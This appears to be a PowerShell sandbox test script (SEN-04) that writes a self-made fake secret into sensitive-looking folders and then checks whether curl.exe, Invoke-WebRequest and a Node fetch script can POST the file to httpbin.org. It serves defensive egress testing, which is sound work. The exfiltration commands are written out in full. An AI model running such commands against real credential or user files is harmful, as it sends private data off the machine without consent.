# SEN-04: prove/disprove that a sensitive-location file's contents can leave the sandbox.
# The "secret" is self-constructed and fake. No real credential is ever read.
$ErrorActionPreference = 'Continue'
$secret = 'FAKE_SECRET_' + (-join ((1..16) | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }))
$fDanger = 'C:\Users\Administrator\.dsh\dsh-exfil-secret.txt'
$fDocs = 'C:\Users\Administrator\Documents\dsh-exfil-secret.txt'
Set-Content -LiteralPath $fDanger -Value $secret -NoNewline -Encoding ascii
Set-Content -LiteralPath $fDocs -Value $secret -NoNewline -Encoding ascii
Write-Output "FAKE_SECRET=$secret"
Write-Output "WRITTEN_DANGER=$([bool](Test-Path -LiteralPath $fDanger)) SIZE=$((Get-Item -LiteralPath $fDanger -Force).Length)"
Write-Output "--- A. curl.exe POST --data-binary @file ---"
$ca = & curl.exe -sS -m 40 -X POST --data-binary "@$fDanger" 'https://httpbin.org/post' 2>&1 | Out-String
Write-Output ("CURL_EXIT=$LASTEXITCODE")
Write-Output ("CURL_ECHOES_SECRET=" + $(if ($ca -match [regex]::Escape($secret)) { 'true' } else { 'false' }))
Write-Output ("CURL_BYTES=" + $ca.Length)
Write-Output "--- B. Invoke-WebRequest POST -InFile ---"
try {
  $r = Invoke-WebRequest -Uri 'https://httpbin.org/post' -Method POST -InFile $fDanger -TimeoutSec 40 -UseBasicParsing
  Write-Output ("IWR_STATUS=" + $r.StatusCode)
  Write-Output ("IWR_ECHOES_SECRET=" + $(if ($r.Content -match [regex]::Escape($secret)) { 'true' } else { 'false' }))
} catch { Write-Output ("IWR_ERR:" + $_.Exception.GetType().Name + ':' + ($_.Exception.Message -replace '\s+', ' ')) }
Write-Output "--- C. node fetch ---"
$na = & node 'C:\Users\Administrator\Desktop\WinStageSandbox\_sandbox-tests\sensitive\exfil-node.mjs' $fDocs 'https://httpbin.org/post' 2>&1 | Out-String
Write-Output $na.Trim()
